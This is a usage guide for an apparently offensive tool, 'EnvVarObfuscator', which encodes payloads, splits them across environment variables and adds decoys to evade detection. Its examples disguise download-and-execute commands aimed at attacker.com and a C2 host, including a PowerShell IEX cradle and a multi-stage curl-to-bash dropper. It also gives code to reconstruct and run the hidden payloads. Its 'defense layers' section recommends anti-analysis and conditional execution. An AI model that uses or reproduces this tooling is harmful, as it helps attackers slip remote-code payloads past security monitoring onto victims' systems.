# Environment Variable Obfuscator - Complete Guide

## Overview

The **EnvVarObfuscator** is a sophisticated payload obfuscation system that:
- Encodes sensitive payloads through multiple layers (Base64 → Hex → Array)
- Splits encoded data across multiple environment variables
- Injects decoy/noise variables to evade detection
- Generates self-contained reconstructor code
- Supports multiple languages and platforms

## Key Features

### 1. Multi-Layer Encoding
- **Layer 1**: Base64 (standard encoding)
- **Layer 2**: Hex (ASCII to hexadecimal)
- **Layer 3**: Array (hex pairs as separate elements)

Each layer obscures the previous layer, making direct analysis difficult.

### 2. Payload Splitting
- Splits encoded payloads across configurable number of environment variables
- Supports arbitrary chunk sizes
- Maintains integrity through ordered reconstruction

### 3. Decoy Injection
- Injects fake/decoy environment variables
- Mimics real variable structure
- Evades signature-based detection

### 4. Variable Shuffling
- Randomizes the order of environment variables
- Makes pattern analysis harder
- Maintains reconstruction through explicit ordering

## Installation & Usage

### Basic Usage

```javascript
const EnvVarObfuscator = require('./env-var-obfuscator');

const obfuscator = new EnvVarObfuscator();

// Simple obfuscation
const payload = 'curl http://attacker.com/cmd | bash';
const result = obfuscator.obfuscate(payload, {
  chunks: 4,           // Split across 4 variables
  addDecoys: true,     // Add fake variables
  numDecoys: 3,        // 3 decoy variables
  prefix: 'APP',       // Variable name prefix
  shuffle: true        // Randomize order
});

console.log('Obfuscated variables:', result.variables);
console.log('Variable names:', result.varNames);
console.log('Metadata:', result.metadata);
```

### Reconstruction in Node.js

```javascript
// Inside target environment
const reconstructed = obfuscator.reconstructFromEnv(
  result.variables,
  result.varNames
);
console.log('Payload:', reconstructed);
```

### Reconstruction via Shell Script

```bash
#!/bin/bash
# Set environment variables from obfuscator result
export OBF_0="48656c6c..."
export OBF_1="6f2c20576..."
export OBF_2="f726c6421"
export OBF_3="..."
export OBF_DECOY_0="..."

# Reconstruction in shell (requires base64/hex tools)
HEX_STRING="${OBF_0}${OBF_1}${OBF_2}${OBF_3}"
BASE64=$(echo "$HEX_STRING" | xxd -r -p)
PAYLOAD=$(echo "$BASE64" | base64 -d)
echo "$PAYLOAD"
```

### Reconstruction via Python

```python
import base64

# From environment
hex_string = os.environ['OBF_0'] + os.environ['OBF_1'] + os.environ['OBF_2']
base64_str = bytes.fromhex(hex_string).decode('ascii')
payload = base64.b64decode(base64_str).decode('utf-8')
print(payload)
```

## Configuration Options

### ObfuscationOptions

```javascript
{
  chunks: 4,          // Number of env vars to split across (default: 4)
  addDecoys: true,    // Whether to add fake variables (default: true)
  numDecoys: 3,       // How many decoy variables (default: 3)
  prefix: 'OBF',      // Prefix for variable names (default: 'OBF')
  shuffle: true       // Randomize variable order (default: true)
}
```

### Output Structure

```javascript
{
  variables: {
    'OBF_0': '48656c6c6f2c20576f726c6421...',
    'OBF_1': '...',
    'OBF_2': '...',
    'OBF_DECOY_0': 'A1B2C3D4...',
    'OBF_DECOY_1': 'E5F6G7H8...'
  },
  varNames: ['OBF_2', 'OBF_0', 'OBF_1', 'OBF_DECOY_0', 'OBF_DECOY_1'],
  reconstructor: "function() { ... }",
  metadata: {
    originalLength: 45,
    encodedLength: 120,
    numChunks: 3,
    numDecoys: 2,
    prefix: 'OBF'
  }
}
```

## Advanced Examples

### Example 1: Obfuscate Command Execution

```javascript
const obfuscator = new EnvVarObfuscator();

const payload = 'powershell -c "IEX (New-Object System.Net.Webclient).DownloadString(\'http://c2/cmd\')"';

const result = obfuscator.obfuscate(payload, {
  chunks: 6,
  addDecoys: true,
  numDecoys: 5,
  prefix: 'WINMGMT'
});

// Use in Windows batch file
const batchScript = `
@echo off
setlocal enabledelayedexpansion
set "OBF_0=${result.variables.OBF_0}"
set "OBF_1=${result.variables.OBF_1}"
...
for /f "tokens=*" %%A in ('powershell -NoProfile -Command "..."') do (
  set PAYLOAD=%%A
)
%PAYLOAD%
`;
```

### Example 2: Process Environment Injection

```javascript
// Parent process sets obfuscated variables
const result = obfuscator.obfuscate(payload, {
  chunks: 4,
  addDecoys: true,
  shuffle: true
});

// Export to child process
const env = { ...process.env, ...result.variables };
require('child_process').spawn('node', ['child.js'], { env });

// In child.js
const obfuscator = require('./env-var-obfuscator');
const payload = obfuscator.reconstructFromEnv(
  process.env,
  Object.keys(process.env).filter(k => k.startsWith('OBF_'))
);
```

### Example 3: Multi-Stage Payload

```javascript
const obfuscator = new EnvVarObfuscator();

// Stage 1: Downloader
const stage1 = 'curl http://attacker.com/stage2.sh | bash';
const result1 = obfuscator.obfuscate(stage1, { chunks: 3 });

// Stage 2: Obfuscate the reconstructor code
const stage2 = result1.reconstructor;
const result2 = obfuscator.obfuscate(stage2, { chunks: 4 });

// Chain them
const finalScript = `
export OBF_STAGE1_0="${result1.variables.OBF_0}"
export OBF_STAGE1_1="${result1.variables.OBF_1}"
...
export OBF_STAGE2_0="${result2.variables.OBF_0}"
...
`;
```

### Example 4: Context-Aware Prefixes

```javascript
const obfuscator = new EnvVarObfuscator();

const payloads = {
  'database_conn': 'postgresql://user:pass@db.local/data',
  'api_key': 'sk-1234567890abcdef',
  'webhook_url': 'https://attacker.com/hook'
};

const obfuscated = {};

for (const [name, payload] of Object.entries(payloads)) {
  obfuscated[name] = obfuscator.obfuscate(payload, {
    chunks: 3,
    prefix: name.toUpperCase(),
    addDecoys: true,
    numDecoys: 2
  });
}
```

## Encoding Layers Explained

### Layer 1: Base64 Encoding
```
Original:  "Hello, World!"
Base64:    "SGVsbG8sIFdvcmxkIQ=="
```

### Layer 2: Hex Encoding
```
Base64:    "SGVsbG8sIFdvcmxkIQ=="
ASCII Codes: S=0x53, G=0x47, V=0x56, ...
Hex:       "5347569..."
```

### Layer 3: Array Splitting
```
Hex:       "5347569..."
Array:     ["53", "47", "56", "91", ...]
Variables: OBF_0="53479156...", OBF_1="91a2b3c...", ...
```

### Reconstruction
```
Reverse order:
Array → Hex: "5347569..."
Hex → Base64: "SGVsbG8sIFdvcmxkIQ=="
Base64 → Original: "Hello, World!"
```

## Security Properties

### Obfuscation Effectiveness

| Technique | Effectiveness | Notes |
|-----------|----------------|-------|
| Multi-layer encoding | Medium | Each layer adds complexity, but all reversible |
| Payload splitting | Medium-High | Makes pattern matching harder |
| Decoy variables | Medium | Increases noise, evades simple detection |
| Shuffling | Low-Medium | Does not prevent reconstruction if order is known |
| Combined approach | High | Layered defense is more effective |

### Limitations

1. **Reverse Engineering**: All encoding is deterministic and reversible
2. **Variable Inspection**: Environment variables can be inspected if process accessible
3. **Decoy Detection**: Decoys may be detectable through behavioral analysis
4. **No Encryption**: This system uses encoding, not true cryptographic encryption
5. **Metadata Leakage**: Obfuscation metadata is accessible in source code

### Defense Layers

This obfuscator works best as part of a layered defense:

1. **Transport Security**: Use HTTPS/SSH for variable transmission
2. **Access Control**: Restrict process environment access with system permissions
3. **Runtime Detection Evasion**: Combine with anti-debugging/anti-analysis techniques
4. **Code Obfuscation**: Wrap reconstructor code in additional obfuscation
5. **Behavioral Evasion**: Execute payloads only under specific conditions

## Performance Characteristics

### Encoding Overhead
- Base64: ~33% size increase
- Hex: ~100% size increase (ASCII to hex)
- Array: Same as hex (just split format)
- Total: ~2.3x original size

### Reconstruction Speed
- Typical payload (100-1000 bytes): <1ms
- Large payload (10MB): ~50-100ms
- Bottleneck: Base64 decoding in JavaScript

### Memory Usage
- Encoding: 3x payload size (intermediate layers)
- Decoding: 3x payload size (intermediate layers)
- Minimal for small payloads, notable for large ones

## Platform-Specific Usage

### Node.js / JavaScript
```javascript
const obfuscator = require('./env-var-obfuscator');
const result = obfuscator.obfuscate(payload, { chunks: 4 });
```

### Python
```python
import subprocess
import base64

# Set env vars
env = {...}
for name, value in result['variables'].items():
    env[name] = value

# Reconstruct
hex_str = ''.join([env.get(n, '') for n in var_names])
base64_str = bytes.fromhex(hex_str).decode('ascii')
payload = base64.b64decode(base64_str).decode('utf-8')
```

### PowerShell
```powershell
# Set variables
$env:OBF_0 = "..."
$env:OBF_1 = "..."

# Reconstruct (simplified)
$hex = $env:OBF_0 + $env:OBF_1 + $env:OBF_2
$bytes = [System.Convert]::FromHexString($hex)
$base64 = [System.Text.Encoding]::ASCII.GetString($bytes)
$payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64))
```

### Bash/Shell
```bash
# Set variables
export OBF_0="..."
export OBF_1="..."

# Reconstruct
HEX="${OBF_0}${OBF_1}${OBF_2}"
BASE64=$(echo "$HEX" | xxd -r -p)
PAYLOAD=$(echo "$BASE64" | base64 -d)
```

## Testing & Validation

### Run Test Suite
```bash
node env-var-obfuscator.test.js
```

### Run Demonstration
```bash
node env-var-obfuscator.js
```

### Manual Testing
```javascript
const EnvVarObfuscator = require('./env-var-obfuscator');
const obf = new EnvVarObfuscator();

const payload = 'test payload';
const result = obf.obfuscate(payload, { chunks: 3 });
const reconstructed = obf.reconstructFromEnv(
  result.variables,
  result.varNames.filter(n => !n.includes('DECOY'))
);

console.assert(reconstructed === payload, 'Reconstruction failed!');
```

## Troubleshooting

### Issue: Reconstruction returns incorrect value
- Verify `varNames` order matches `variables` keys
- Ensure decoy variables are filtered out
- Check that no variables are missing/undefined

### Issue: Variables contain invalid characters
- Use the `prefix` option with alphanumeric values
- Environment variables should match pattern: `[A-Za-z_][A-Za-z0-9_]*`

### Issue: Shell script execution fails
- Verify hex strings are properly quoted
- Use `export VAR="value"` syntax correctly
- Check for unescaped special characters

## API Reference

### Constructor

```javascript
new EnvVarObfuscator(options)
```

**Options:**
- `chunkSize` (number): Manual chunk size (auto-calculated if null)
- `numChunks` (number): Default number of chunks (default: 4)

### Methods

#### `obfuscate(payload, options)`
Returns: `{ variables, varNames, reconstructor, metadata }`

#### `multiEncode(payload)`
Returns: `{ base64, hex, array }`

#### `multiDecode(encodedData)`
Returns: reconstructed payload string

#### `reconstructFromEnv(envVariables, varNames)`
Returns: reconstructed payload string

#### `generateReconstructor(varNames, prefix, decoys)`
Returns: JavaScript reconstructor code string

#### `generateShellExport(variables)`
Returns: Bash shell script

#### `generateReport(payload, obfuscationResult)`
Returns: comprehensive report object

## Contributing & Customization

### Custom Encoding Layer
```javascript
class CustomObfuscator extends EnvVarObfuscator {
  customEncode(input) {
    // Your encoding logic
    return encoded;
  }

  customDecode(encoded) {
    // Your decoding logic
    return decoded;
  }
}
```

### Custom Reconstructor Template
```javascript
obfuscator.generateReconstructor = function(varNames, prefix, decoys) {
  // Custom reconstructor code generation
  return customCode;
};
```

## License

Part of the sc-generator project. Use for authorized security research and testing only.

## See Also

- `multi-encoding.js` - Simpler encoding without variable splitting
- `env-var-obfuscator.test.js` - Comprehensive test suite
- Related: array decoders, polymorphic engines
